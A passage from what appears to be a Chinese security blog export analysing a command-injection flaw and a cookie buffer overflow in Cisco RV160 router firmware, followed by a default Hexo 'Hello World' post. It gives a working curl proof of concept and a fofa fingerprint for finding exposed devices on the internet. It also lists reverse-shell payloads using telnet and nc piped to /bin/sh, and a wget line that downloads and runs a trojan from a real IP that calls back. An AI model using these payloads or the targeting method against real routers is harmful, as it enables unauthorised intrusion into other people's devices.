src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211206223618352.png" alt="image-20211206223618352"></p><p>而dword_34F60 的值则在如下的代码中进行解析，这个部分的代码在mini_httpd.c 中是一样的。</p><p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211206223847690.png" alt="image-20211206223847690"></p><p>接下来分析在sub_1AF58()函数中的漏洞点，其中dword_35180的值是Authorization的值，而获取的值中要包含 “ Basic ” 字符串。</p><p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211206225203066.png" alt="image-20211206225203066"></p><p>Authorization:</p><p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211206225023028.png" alt="image-20211206225023028"></p><h2 id="0x05-环境搭建"><a href="#0x05-环境搭建" class="headerlink" title="0x05 环境搭建"></a>0x05 环境搭建</h2><p>首先查看文件系统的指令架构，文件系统位ARM </p><figure class="highlight plaintext"><figcaption><span>~/i/g/c/_/_/_/_/_/u/4/r/bin> file ./busybox</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tigerortiger@ubuntu">./busybox: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.3, for GNU/Linux 2.6.16, stripped<br></code></pre></td></tr></table></figure><p>配置qemu 之前的环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs bash">tigerortiger@ubuntu ~&gt; <span class="hljs-built_in">cat</span> /etc/network/interfaces<br><span class="hljs-comment"># interfaces(5) file used by ifup(8) and ifdown(8)</span><br>auto lo<br>iface lo inet loopback<br>auto eth0<br>iface eth0 inet dhcp<br><span class="hljs-comment">#up ifconfig eth0 0.0.0.0 up</span><br><span class="hljs-comment">#auto br0</span><br>iface br0 inet dhcp<br> bridge_ports eth0<br> bridge_maxwait 0<br><br>tigerortiger@ubuntu ~&gt; <span class="hljs-built_in">cat</span> /etc/qemu-ifup<br><span class="hljs-comment">#! /bin/sh</span><br><span class="hljs-comment"># Script to bring a network (tap) device for qemu up.</span><br><span class="hljs-comment"># The idea is to add the tap device to the same bridge</span><br><span class="hljs-comment"># as we have default routing to.</span><br><br><span class="hljs-comment"># in order to be able to find brctl</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Execute /etc/qemu-ifup&quot;</span><br><span class="hljs-comment">#sudo ifdown eth0</span><br><span class="hljs-comment">#sudo ifup br0</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Bringing up <span class="hljs-variable">$1</span> for bridge mode..&quot;</span><br>sudo /sbin/ifconfig <span class="hljs-variable">$1</span> 0.0.0.0 promisc up<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;adding <span class="hljs-variable">$1</span> to br0&quot;</span><br>sudo /sbin/brctl addif br0 <span class="hljs-variable">$1</span><br><span class="hljs-built_in">sleep</span> 2<br>tigerortiger@ubuntu ~&gt; sudo /etc/init.d/networking restart <br>[ ok ] Restarting networking (via systemctl): networking.service.<br>tigerortiger@ubuntu ~&gt; sudo ifdown eth0 <br>Killed old client process<br>Internet Systems Consortium DHCP Client 4.3.5<br>Copyright 2004-2016 Internet Systems Consortium.<br>All rights reserved.<br>For info, please visit https://www.isc.org/software/dhcp/<br><br>Listening on LPF/eth0/00:0c:29:e5:1b:a2<br>Sending on   LPF/eth0/00:0c:29:e5:1b:a2<br>Sending on   Socket/fallback<br>DHCPRELEASE on eth0 to 192.168.214.254 port 67 (xid=0x4c602cbd)<br>tigerortiger@ubuntu ~&gt; sudo ifup br0<br>Internet Systems Consortium DHCP Client 4.3.5<br>Copyright 2004-2016 Internet Systems Consortium.<br>All rights reserved.<br>For info, please visit https://www.isc.org/software/dhcp/<br><br>Listening on LPF/br0/00:0c:29:e5:1b:a2<br>Sending on   LPF/br0/00:0c:29:e5:1b:a2<br>Sending on   Socket/fallback<br>DHCPDISCOVER on br0 to 255.255.255.255 port 67 interval 3 (xid=0xd8f3411e)<br>DHCPREQUEST of 192.168.214.129 on br0 to 255.255.255.255 port 67 (xid=0x1e41f3d8)<br>DHCPOFFER of 192.168.214.129 from 192.168.214.254<br>DHCPACK of 192.168.214.129 from 192.168.214.254<br>bound to 192.168.214.129 -- renewal <span class="hljs-keyword">in</span> 852 seconds.<br><br></code></pre></td></tr></table></figure><p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211207142457380.png" alt="image-20211207142457380"></p><p>配置IP，保证qemu 和宿主机网络能畅通。</p><p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211207143748443.png" alt="image-20211207143748443"></p><p>把固件文件系统拷贝到qemu 中。</p><figure class="highlight plaintext"><figcaption><span>~/i/g/c/_/_/_/_/_/u/454748969 [1]> pwd</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tigerortiger@ubuntu">/home/tigerortiger/iot/gujian/cisco/_RV16X_26X-v1.0.01.01-2020-08-17-11-09-01-AM.img.extracted/_40.extracted/_fw.gz.extracted/_0.extracted/_openwrt-comcerto2000-hgw-rootfs-ubi_nand.img.extracted/ubifs-root/454748969<br>tigerortiger@ubuntu ~/i/g/c/_/_/_/_/_/u/454748969&gt; scp -r ./rootfs root@192.168.214.130:/root/<br></code></pre></td></tr></table></figure><p>挂载关键目录</p><p>mount -t proc  &#x2F;proc&#x2F; .&#x2F;proc&#x2F;</p><p>mount -t devtmpfs &#x2F;dev&#x2F; .&#x2F;dev&#x2F;</p><blockquote><p>挂载指的是将硬件设备的文件系统和Linux 系统中的文件系统，通过指定目录（作为挂载点）进行关联，而要将文件系统挂载到Linux系统上，就需要使用mount挂载命令。</p><p>mount 设备文件名 挂载点</p></blockquote><p>chroot 出现了错误。</p><p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211207173855519.png" alt="image-20211207173855519"></p><p> chroot: failed to run command &#96;.&#x2F;bin&#x2F;sh’: Permission denied</p><p>解决方案</p><p>chmod -R 777 .&#x2F;cisco_RV160</p><p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211207173949545.png" alt="image-20211207173949545"></p><p>启动mini_httpd.init 文件。</p><p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211207201528596.png" alt="image-20211207201528596"></p><figure class="highlight plaintext"><figcaption><span>#</span><a href="/etc/init.d/mini_httpd.init">link</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs /">/ # /etc/init.d/mini_httpd.init <br>uci: Entry not found<br>Syntax: /etc/init.d/mini_httpd.init [command]<br><br>Available commands:<br>startStart the service<br>stopStop the service<br>restartRestart the service<br>reloadReload configuration files (or restart if that fails)<br>enableEnable service autostart<br>disableDisable service autostart<br><br>/ # /etc/init.d/mini_httpd.init start<br>uci: Entry not found<br>ls: /mnt/configcert/confd/startup/: No such file or directory<br>use backup cert for mini-httpd ...<br>1 0 0 0<br>setsockopt SO_REUSEADDR: Protocol not available<br>setsockopt SO_REUSEADDR: Protocol not available<br>/usr/sbin/mini_httpd: can&#x27;t bind to any address<br></code></pre></td></tr></table></figure><p>根据执行mini_httpd.init 的报错信息来看，setsockopt()函数调用时报错,这个函数的定义如下。</p><blockquote><p>定义函数：int setsockopt(int s, int level, int optname, const void * optval, ,socklen_toptlen);</p><p>函数说明：setsockopt()用来设置参数s 所指定的socket 状态</p></blockquote><p>这里我们直接使用加载LD_PRELOAD 来进行hook，这里要注意的是hook和setsockopt一样的函数，包括名称、变量及类型、返回值及类型等。</p><p>查看mini_httpd 中setsockopt函数的定义</p><p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211207215016628.png" alt="image-20211207215016628"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><br><span class="hljs-comment">/* arm-linux-gnueabi-gcc -shared -fPIC hook_setsockopt.c -o hooksetsockopt  */</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">setsockopt</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">int</span> level, <span class="hljs-type">int</span> optname, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *optval, <span class="hljs-type">socklen_t</span> optlen)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译hook_setsockopt.c </p><p>tigerortiger@ubuntu ~&#x2F;i&#x2F;g&#x2F;c&#x2F;<em>&#x2F;</em>&#x2F;<em>&#x2F;</em>&#x2F;<em>&#x2F;u&#x2F;4&#x2F;rootfs&gt;<br>arm-linux-gnueabi-gcc -shared -fPIC hook_setsockopt.c -o hook_setsockopt<br>tigerortiger@ubuntu ~&#x2F;i&#x2F;g&#x2F;c&#x2F;</em>&#x2F;<em>&#x2F;</em>&#x2F;<em>&#x2F;</em>&#x2F;u&#x2F;4&#x2F;rootfs&gt; file hook_setsockopt<br>hook_setsockopt: ELF 32-bit LSB shared object, ARM, EABI5 version 1 (SYSV), dynamically linked, BuildID[sha1]&#x3D;7708ce4cab994360cc2082b5e82caf10f7ba881e, not stripped</p><p>启动 mini_httpd</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs tcl">root@debian-armhf:~/cisco_rv160# chroot . ./bin/sh<br><br><br>BusyBox v1<span class="hljs-number">.23</span><span class="hljs-number">.2</span> (<span class="hljs-number">2020</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">10</span>:<span class="hljs-number">59</span>:<span class="hljs-number">42</span> IST) built-in shell (ash)<br><br>/ # ls<br>bin              media            root             usr<br>dev              mnt              sbin             var<br>etc              overlay          sys              www<br>hook_setsockopt  <span class="hljs-keyword">proc</span><span class="hljs-title">             test_scripts</span><br>lib<span class="hljs-title">              rom</span> <span class="hljs-title">             tmp</span><br>/ #<span class="hljs-title"> LD_PRELOAD=&quot;/hook_setsockopt&quot;</span> ./usr/sbin/mini_httpd -p 8009<span class="hljs-title"></span><br><span class="hljs-title">bind:</span> Address<span class="hljs-title"> already</span> in<span class="hljs-title"> use</span><br>/ # ./usr/sbin/mini_httpd:<span class="hljs-title"> started</span> as<span class="hljs-title"> root</span> without<span class="hljs-title"> requesting</span> chroot(),<span class="hljs-title"> warning</span> only<br><br>/ #<span class="hljs-title"> exit</span><br>root@debian-armhf:~/cisco_rv160#<span class="hljs-title"> ps</span> -ef |<span class="hljs-title"> grep</span> &quot;mini_httpd&quot;<span class="hljs-title"></span><br><span class="hljs-title">root</span>      2606     1  0 11:42 ?        00:00:00 ./usr/sbin/mini_httpd<span class="hljs-title"></span><br><span class="hljs-title">root</span>      2608  2324 20 11:43<span class="hljs-title"> ttyAMA0</span>  00:00:00<span class="hljs-title"> grep</span> mini_httpd<span class="hljs-title"></span><br><span class="hljs-title">root@debian-armhf:~/cisco_rv160#</span> lsof -i:8009<span class="hljs-title"></span><br><span class="hljs-title">COMMAND</span> <span class="hljs-title">   PID</span> USER<span class="hljs-title">   FD</span> <span class="hljs-title">  TYPE</span> DEVICE<span class="hljs-title"> SIZE/OFF</span> NODE<span class="hljs-title"> NAME</span><br>mini_http 3222<span class="hljs-title"> root</span>    3u<span class="hljs-title">  IPv6</span>   6465      0t0<span class="hljs-title">  TCP</span> *:8009 (LISTEN)<br></code></pre></td></tr></table></figure><p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211208165707403.png" alt="image-20211208165707403"></p><p>batch</p><p>ARM 汇编的NOP 指令是 mov r0,r0 。直接patch sub_1B5F0 为NOP, 这样就不会报错了，程序继续往下执行。</p><p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211208104529045.png" alt="image-20211208104529045"></p><p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211208104402863.png" alt="image-20211208104402863"></p><p>重新启动mini_http 组件，可以看到设备的访问界面了。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">LD_PRELOAD</span>=<span class="hljs-string">&quot;/hook_setsockopt&quot;</span> ./usr/sbin/mini_http_hook -p <span class="hljs-number">9009</span><br></code></pre></td></tr></table></figure><p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211208171114599.png" alt="image-20211208171114599"></p><h2 id="0x06-远程调试漏洞"><a href="#0x06-远程调试漏洞" class="headerlink" title="0x06 远程调试漏洞"></a>0x06 远程调试漏洞</h2><p>开启远程调试</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@debian-armhf:~/cisco_rv160# ps -ef | grep <span class="hljs-string">&quot;mini_http_hook&quot;</span><br><span class="hljs-attribute">root</span>      <span class="hljs-number">3351</span>     <span class="hljs-number">1</span>  <span class="hljs-number">0</span> <span class="hljs-number">20</span>:<span class="hljs-number">32</span> ?        <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> ./usr/sbin/mini_http_hook -p <span class="hljs-number">8009</span><br><span class="hljs-attribute">root</span>      <span class="hljs-number">3354</span>  <span class="hljs-number">2324</span>  <span class="hljs-number">0</span> <span class="hljs-number">20</span>:<span class="hljs-number">33</span> ttyAMA0  <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> grep mini_http_hook<br><span class="hljs-attribute">root</span>@debian-armhf:~/cisco_rv160# ./gdbserver :<span class="hljs-number">1234</span> --attach <span class="hljs-number">3351</span><br><span class="hljs-attribute">Attached</span>; pid = <span class="hljs-number">3351</span><br><span class="hljs-attribute">Listening</span> <span class="hljs-literal">on</span> port <span class="hljs-number">1234</span><br></code></pre></td></tr></table></figure><p>远程连接</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams">tigerortiger@ubuntu &gt; gdb-multiarch -q mini_httpd<br>pwndbg&gt; <span class="hljs-keyword">set</span> architecture <span class="hljs-comment">arm</span><br>The <span class="hljs-comment">target architecture is assumed to be arm</span><br>pwndbg&gt; target <span class="hljs-comment">remote 192.168.214.130:1234</span><br></code></pre></td></tr></table></figure><p>发送POC</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">curl -<span class="hljs-type">X</span> <span class="hljs-type">GET</span> -<span class="hljs-type">H</span> <span class="hljs-symbol">&#x27;Authorization</span>: <span class="hljs-type">Basic</span> <span class="hljs-type">O3RvdWNoIC90bXAvaGFwcHloYWNraW5nOwoK&#x27;</span> -i <span class="hljs-symbol">&#x27;http</span>:<span class="hljs-comment">//192.168.214.130:8009/download/dniapi/</span><br></code></pre></td></tr></table></figure><p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211209223721558.png" alt="image-20211209223721558"></p><p>断点到0x001b11c 处，可以看到我们拼接的字符串“ ;touch &#x2F;tmp&#x2F;happyhacking;”</p><p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211209224214203.png" alt="image-20211209224214203"></p><p>执行完了之后，成功执行命令。</p><p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211209224458063.png" alt="image-20211209224458063"></p><h2 id="公网测试"><a href="#公网测试" class="headerlink" title="公网测试"></a>公网测试</h2><p>公网设备指纹：在fofa上搜索 header&#x3D;”frame-ancestors ‘self’ ‘unsafe-inline’ ‘unsafe-eval’; script-src ‘self’ ‘unsafe-inline’ ‘unsafe-eval’; style-src ‘self’ ‘unsafe-inline’ ‘unsafe-eval’”</p><p>经过测试，可以获取到shell。</p><p>通过telnet 获取shell<br>;telnet ip port1 | &#x2F;bin&#x2F;sh | telnet ip port2;</p><p>通过nc 获取shell,nc 没有-e 的功能。<br>;nc ip port1 | &#x2F;bin&#x2F;sh | nc ip port2;</p><p>通过木马程序获取shell</p><p>设备的指令架构为armv7L</p><p>;wget <a href="http://8.141.70.26:9008/chell_armv7L">http://8.141.70.26:9008/chell_armv7L</a> -O &#x2F;tmp&#x2F;qqqqq;chmod 777 &#x2F;tmp&#x2F;qqqqq;.&#x2F;chell_armv7L 8.141.70.26 9004;</p><h2 id="缓冲区溢出漏洞分析"><a href="#缓冲区溢出漏洞分析" class="headerlink" title="缓冲区溢出漏洞分析"></a>缓冲区溢出漏洞分析</h2><p>在handle_request 函数中有如下代码，获取cookies 的值</p><blockquote><p>定义函数：int strncasecmp(const char *s1, const char *s2, size_t n);</p><p>函数说明：strncasecmp()用来比较参数s1 和s2 字符串前n个字符，比较时会自动忽略大小写的差异。</p><p>返回值：若参数s1 和s2 字符串相同则返回0。s1 若大于s2 则返回大于0 的值，s1 若小于s2 则返回小于0 的值。</p><p>定义函数： size_t strspn(const char *str1,const char *str2)</p><p>函数说明： 检索字符串str1中第一个不在字符串str2中出现的字符下标</p><p>返回值：该函数返回str1中第一个不在字符串str2中出现的字符下标</p></blockquote><p>下图的代码的意思是，先判断字符串中存在“Cookie: ” 字符串，如果有，那就获取cookes 的值。strspn(s1+7,”\t”) 的意思是获取cookies 的值最后的下标。</p><p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211210155658793.png" alt="image-20211210155658793"></p><p>接下来看那个函数是用来cookies 的值。</p><p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211210161633200.png" alt="image-20211210161633200"></p><p>但是在哪之前，sub_169F0()函数，这个函数是用来判断当前请求的url资源内容是否需要登录才能访问。</p><p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211212212120467.png" alt="image-20211212212120467"></p><p>进入到sub_1625C函数中，a1 的值是cookies ，代码是判断cookies 不为空就进入到sub_16138函数。</p><p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211212222952416.png" alt="image-20211212222952416"></p><p>进入到sub_16138函数中。从这个函数中，可以看出来，这个函数是获取cookeis 的值中的sessionID 的值。</p><blockquote><p>char *strstr(const char *haystack, const char *needle)** 在字符串 <strong>haystack</strong> 中查找第一次出现字符串 <strong>needle</strong> 的位置，不包含终止符 ‘\0’</p><p>char *strtok(char *str, const char *delim) 分解字符串str为一组字符串，delim为分隔符。delim 包含分隔符的C字符串。</p><p>返回值：该函数返回被分解的第一个字符串，如果没有可检索的字符串，则返回一个空指针。</p></blockquote><p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211212223526769.png" alt="image-20211212223526769"></p><p>sub_15CE4()函数中，形参a2 指向空字符，所以其实最后就是未限制sessionID长度在strcpy时的溢出</p><p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211212232211788.png" alt="image-20211212232211788"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>Cisco RV160W 系列路由器漏洞：从1day 分析到0day挖掘</p><p><a href="https://mp.weixin.qq.com/s/8qviTeiuJb5XU8jDdHMW8Q">https://mp.weixin.qq.com/s/8qviTeiuJb5XU8jDdHMW8Q</a></p><p>bindiff 文件对比参考RX40 的文章</p><p>交叉编译出和这个固件相同的ARM EABI5。使用的交叉工具链为arm-linux-gnueabihf-gcc</p><p><a href="https://blog.csdn.net/xukai871105/article/details/37345857">https://blog.csdn.net/xukai871105/article/details/37345857</a></p><p>使用qemu chroot 进行固件本地调试</p><p><a href="http://blog.nsfocus.net/qemu-chroot/">http://blog.nsfocus.net/qemu-chroot/</a></p><p>mount 挂载的相关资料</p><p><a href="https://www.cnblogs.com/sparkdev/p/9015312.html">https://www.cnblogs.com/sparkdev/p/9015312.html</a></p><p>ARM 汇编NOP指令的二进制</p><p><a href="https://blog.csdn.net/zhangmiaoping23/article/details/43309455">https://blog.csdn.net/zhangmiaoping23/article/details/43309455</a></p><p>curl  详解</p><p><a href="https://www.cnblogs.com/aftree/p/9293071.html">https://www.cnblogs.com/aftree/p/9293071.html</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/12/15/hello-world/"/>
    <url>/2023/12/15/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><p><img src="/pic/1280310.png" alt="img"></p><p>asa<br><img src="/pic_test/1280310.png" alt="img"></p><p>asdasda</p><p><img src="/../../source/images/pic_test/1280310.png" alt="img"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
